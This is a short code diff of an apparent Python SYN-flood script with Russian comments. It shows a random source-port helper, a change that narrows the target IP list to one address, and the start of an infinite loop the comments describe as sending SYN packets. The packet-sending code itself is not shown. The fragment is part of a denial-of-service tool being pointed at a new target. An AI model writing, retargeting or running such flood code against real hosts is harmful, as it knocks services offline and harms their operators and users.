@@ -11,7 +11,7 @@ def random_port():
     return random.randint(1024, 65535)
 
 # IP-адреса целей
-targets = ["100.0.0.10", "10.0.0.51"]
+targets = ["100.0.0.45"]
 
 # Бесконечный цикл для отправки SYN-пакетов
 while True:
